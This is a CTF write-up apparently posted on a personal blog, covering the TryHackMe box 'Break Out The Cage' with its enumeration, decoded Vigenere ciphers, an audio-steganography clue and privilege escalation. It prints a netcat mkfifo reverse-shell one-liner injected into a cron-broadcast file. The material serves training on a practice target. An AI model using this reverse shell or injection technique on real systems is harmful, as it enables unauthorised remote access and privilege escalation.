---
layout:     post
title:      "Break Out The Cage"
subtitle:   "TryHackMe Pen Test CTF"
date:       2020-07-28
author:     "Dorian"
theme:      jekyll-theme-hacker
---

# Break Out The Cage (tryhackme)

This tryhackme box was definetly the most difficult one I have done so far as there are no hints as to how to gain access into this box and 
escalate privledges. You will notice my IP changes throughout this box because the box terminates after 1 hour if you don't extend your time. 
Therefore, I had to load the box a few times as this took a few hours. Overall this box was very unique in the way of gaining the initial foothold. 
The flags in this write-up have been redacted for anyone still trying to do this box.

## Nmap Scan

The first thing that we should do is run nmap scans to verify which ports are open on this box. Output below:

```
kali@kali:~/Documents/tryhackme/Break_Out_The_Cage$ nmap -sV -sC -oA nmap/initial 10.10.80.237 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-25 21:21 EDT
Nmap scan report for 10.10.80.237
Host is up (0.15s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.74.9
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Nicholas Cage Stories
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

## Gobuster Directory Enum

Since this box has a web server we can try to enumerate the directories on this box using gobuster. 

```
kali@kali:~/Documents/tryhackme/Break_Out_The_Cage$ sudo gobuster dir -u http://10.10.70.122 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[sudo] password for kali: 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.70.122
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/25 22:13:26 Starting gobuster
===============================================================
/images (Status: 301)
/html (Status: 301)
/scripts (Status: 301)
/contracts (Status: 301)
/auditions (Status: 301)
/server-status (Status: 403)
```

# Sniffing for Foothold


I noticed FTP was running on port 21 with anonymous login enabled. Lets see what we can find.

```
kali@kali:~/Documents/tryhackme/Break_Out_The_Cage$ ftp 10.10.70.122
Connected to 10.10.70.122.
220 (vsFTPd 3.0.3)
Name (10.10.70.122:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
226 Directory send OK.
ftp> 
```
I see a dad_tasks file in the home directory of the anonymous user. I grabbed the file using "get dad_tasks"

Taking a look at the file I see test encoded with base64!

```
kali@kali:~/Documents/tryhackme/Break_Out_The_Cage$ strings dad_tasks 
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtb
CBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbm
wgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlk
aXp3bGtic2lkaXVzY3ds
```

Next is to decode the string and see what it says!

```
kali@kali:~/Documents/tryhackme/Break_Out_The_Cage$ echo UWFwdyBFZWtjbCAtIFB2clrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

Attempted to decode the string using ROT13 was not working. Maybe this was a rabbit hole... Lets look at some other directories. 
We see an /auditions directory path. 
There is an mp3 file named "must_practice_corrupt_file.mp3"

![Image](https://Dorianlockhart.github.io/img/nickcageauditionpage.png)

Listening to the file, there is a section where the audio messes up. Strange...
I looked up how to analyze audio files and found a program called Audacity. I wanted to see what the wavelength looks like. 

![Image](https://Dorianlockhart.github.io/img/AudacityNickCage.png)

I found out how to change the spectrum on the file and looked at the block of noice interference.

![Image](https://Dorianlockhart.github.io/img/AudacitySpectrogramNickCage.png)

I saw something in there and decided to zoom in and see what it was.

![Image](https://Dorianlockhart.github.io/img/namelesstwo.png)

BEHOLD! We see text saying "namelesstwo". 
That HAS to be usefull somehow. Possible password? or key phrase for the cipher in the dad_tasks file? 

First thing I looked at were different types of ciphers with keyphrases and so I found the Vigenere Cipher. 

I found a python script that will decode this for me and edited it to only decrypt.
Link to script: https://github.com/geektechdude/Python_Encryption/blob/master/geektechstuff_vigenere_cipher.py

I ran the script line by line and this is the output:

```
Please enter encryption key: namelesstwo
Please enter a string of text: Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!

Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... <REDACTED>
```

I got the text!!!!

Step 1 Completed!

## Task 2
Now that I have credentials, we logged into the user 'weston' through ssh with the decrypted password.
After successfully logging in as weston, we see nothing in his home directory. I want to see where I can use root commands and I found 
a directory of /usr/bin/bees.

```
#!/bin/bash

wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
```

Now, I want to enumerate the user weston for any possible ways of escalating privileges using linpeas. I used the command scp command to 
do so.

```
scp linpeas.sh weston@$IP:/dev/shm
```

I found a hidden directory in the cage group that I can view. The user weston is part of the cage group using the id command. 

```
weston@national-treasure:/opt/.dads_scripts$ ls -la
total 16
drwxr-xr-x 3 cage cage 4096 May 26 08:36 .
drwxr-xr-x 3 root root 4096 May 25 23:50 ..
drwxrwxr-x 2 cage cage 4096 May 25 23:47 .files
-rwxr--r-- 1 cage cage  255 May 26 08:36 spread_the_quotes.py
weston@national-treasure:/opt/.dads_scripts$ cd .files/
weston@national-treasure:/opt/.dads_scripts/.files$ ;s
-bash: syntax error near unexpected token `;'
weston@national-treasure:/opt/.dads_scripts/.files$ ls
weston@national-treasure:/opt/.dads_scripts/.files$ ls -la
total 16
drwxrwxr-x 2 cage cage 4096 May 25 23:47 .
drwxr-xr-x 3 cage cage 4096 May 26 08:36 ..
-rwxrw---- 1 cage cage 4204 May 25 23:47 .quotes
weston@national-treasure:/opt/.dads_scripts/.files
```
I see in the hidden directory that I have execute perms on the .quotes file. Lets see if I can get a reverse shell in this file.

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.74.9 9999 >/tmp/f

```
weston@national-treasure:/opt/.dads_scripts/.files$ echo "testing;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.74.9 9999 >/tmp/f" > .quotes
```
When the broadcast timer hits 0 it will broadcast our "new" message being or reverse shell.

Woohoo! We got a rev shell!

```
weston@national-treasure:/opt/.dads_scripts/.files$ echo "testing;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.74.9 9999 >/tmp/f" > .quotes
                                                                               
Broadcast message from cage@national-treasure (somewhere) (Mon Jul 27 16:36:01 
                                                                               
testing

```

```
kali@kali:~$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.9.74.9] from (UNKNOWN) [10.10.3.136] 46678
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(cage) gid=1000(cage) groups=1000(cage),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
$ 
```
Looking in cage's home directory, we see 2 things. I decided to look in Super_Duper_Checklist. We got the user flag! Step 2 complete!

```
$ ls
email_backup
Super_Duper_Checklist
$ cat Super_Duper_Checklist
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: <REDACTED> <-- This was the user flag.
$ 
```

I saw a directory in cage's home directory called email_backup and decided to view the contents.

```
$ cat email_1                                                                                                                                                                                                                              
From - SeanArcher@BigManAgents.com                                                                                                                                                                                                         
To - Cage@nationaltreasure.com                                                                                                                                                                                                             
                                                                                                                                                                                                                                           
Hey Cage!                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                           
There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the                                                                                                                                                    
planning stages at the moment. I've put a good word in for you, if you're lucky we                                                                                                                                                         
might be able to get you a part of an angry shop keeping or something? Would you be up                                                                                                                                                     
for that, the money would be good and it'd look good on your acting CV.                                                                                                                                                                    
                                                                                                                                                                                                                                           
Regards                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                           
Sean Archer
$ cat email_2
From - Cage@nationaltreasure.com
To - SeanArcher@BigManAgents.com

Dear Sean

We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
I could of made them great... great Sean.... I think you're missing my true potential.

On a much lighter note thank you for helping me set up my home server, Weston helped too, but
not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?

Yours

Cage
$ cat email_3
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage
```

The second email points to a root user and the third email points to a possible password. Lets try it.

```
kali@kali:~$ ssh Root@10.10.3.136
Root@10.10.3.136's password: 
Permission denied, please try again.
```

Looking back at the password, maybe it is encrypted using some cipher. I want to try the Viginere cipher again. Looking at the 3rd email, one 
word seems to repeat itself "face". Lets decrypt using the word face. Now this step actually took some time to do as I had no idea what the key was. 
This was an observated guess.

```
kali@kali:~/Documents/tryhackme/Break_Out_The_Cage$ ./decrypt.py 
Please enter encryption key: face
Please enter a string of text: haiinspsyanileph
cageisnotalegend
```
We got a match! Lets try to login with that password.

```
weston@national-treasure:/opt/.dads_scripts/.files$ su root
Password: 
root@national-treasure:/opt/.dads_scripts/.files# cd /home
root@national-treasure:/home# 
```

I see another email_backup directory. Lets see whats inside.

```
root@national-treasure:/home# cd /root/
root@national-treasure:~# ls
email_backup
root@national-treasure:~# cd email_backup/
root@national-treasure:~/email_backup# ls
email_1  email_2
root@national-treasure:~/email_backup# cat email_1
From - SeanArcher@BigManAgents.com
To - master@ActorsGuild.com

Good Evening Master

My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
Eventually the whole world will see who Cage really is! Our masterplan is coming together
master, I'm in your debt.

Thank you

Sean Archer
root@national-treasure:~/email_backup# cat email_2
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

<REDACTED> <-- This was the root flag

Thank you

Sean Archer

```

Found our root flag!

Step 3 completed! Hope you enjoyed! This box was extremely fun, using stegonagraphy was new to me so being able to apply this was great!

